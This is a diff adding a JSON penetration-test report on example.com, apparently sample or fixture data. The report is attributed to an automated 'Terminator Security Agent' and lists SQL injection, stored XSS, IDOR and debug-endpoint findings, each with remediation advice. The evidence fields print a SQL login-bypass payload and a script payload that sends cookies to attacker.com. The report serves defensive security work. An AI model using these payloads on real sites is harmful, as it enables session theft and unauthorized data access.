@@ -1,0 +1,70 @@
+{
+  "metadata": {
+    "target": "example.com",
+    "assessment_date": "2026-02-17",
+    "assessor": "Terminator Security Agent",
+    "scope": "Web application and API endpoints"
+  },
+  "findings": [
+    {
+      "id": "TERM-001",
+      "title": "SQL Injection in Login Endpoint",
+      "severity": "critical",
+      "cwe": "CWE-89",
+      "cvss": "9.8",
+      "description": "The login endpoint at /api/auth/login directly interpolates user-supplied input into a SQL query without sanitization. An attacker can bypass authentication or extract the entire database contents.",
+      "location": {
+        "file": "src/auth/login.py",
+        "line": 42,
+        "column": 10
+      },
+      "evidence": "Payload: ' OR '1'='1' -- \nResponse: HTTP 200 with admin session cookie\nExtracted: users table with 5,432 records",
+      "remediation": "Use parameterized queries or ORM methods. Replace string interpolation with prepared statements. Example: cursor.execute('SELECT * FROM users WHERE username = %s AND password = %s', (username, password))"
+    },
+    {
+      "id": "TERM-002",
+      "title": "Stored XSS in User Profile Bio Field",
+      "severity": "high",
+      "cwe": "CWE-79",
+      "cvss": "7.4",
+      "description": "The user profile bio field does not sanitize HTML input before storing or rendering. Attackers can inject persistent JavaScript that executes in the browser of any user viewing the profile.",
+      "location": {
+        "file": "src/profile/views.py",
+        "line": 118,
+        "column": 25
+      },
+      "evidence": "Payload: <script>fetch('https://attacker.com/steal?c='+document.cookie)</script>\nVerified cookie exfiltration from victim session.",
+      "remediation": "Apply HTML entity encoding on output. Use a content security policy (CSP) header. Validate and strip dangerous tags server-side using a library such as bleach."
+    },
+    {
+      "id": "TERM-003",
+      "title": "Insecure Direct Object Reference on Invoice Download",
+      "severity": "medium",
+      "cwe": "CWE-639",
+      "cvss": "6.5",
+      "description": "The invoice download endpoint /api/invoices/{id}/download does not verify that the requesting user owns the invoice. Incrementing the numeric ID allows access to any user's financial documents.",
+      "location": {
+        "file": "src/billing/invoice_api.py",
+        "line": 77,
+        "column": 5
+      },
+      "evidence": "Authenticated as user ID 1001, accessed invoice ID 999 belonging to user ID 1000. HTTP 200 returned with full PDF.",
+      "remediation": "Add authorization check: verify invoice.owner_id == current_user.id before returning the document. Apply this check server-side for every object-level access."
+    },
+    {
+      "id": "TERM-004",
+      "title": "Sensitive Data Exposure via Debug Endpoint",
+      "severity": "low",
+      "cwe": "CWE-200",
+      "cvss": "3.7",
+      "description": "The /debug/config endpoint is accessible without authentication and returns internal configuration including database connection strings and third-party API keys.",
+      "location": {
+        "file": "src/debug/routes.py",
+        "line": 12,
+        "column": 1
+      },
+      "evidence": "GET /debug/config returned 200 with JSON including DB_URL, STRIPE_SECRET_KEY, and internal IP ranges.",
+      "remediation": "Remove or disable debug endpoints in production. If required for internal use, protect with authentication and IP allowlisting. Rotate any exposed credentials immediately."
+    }
+  ]
+}
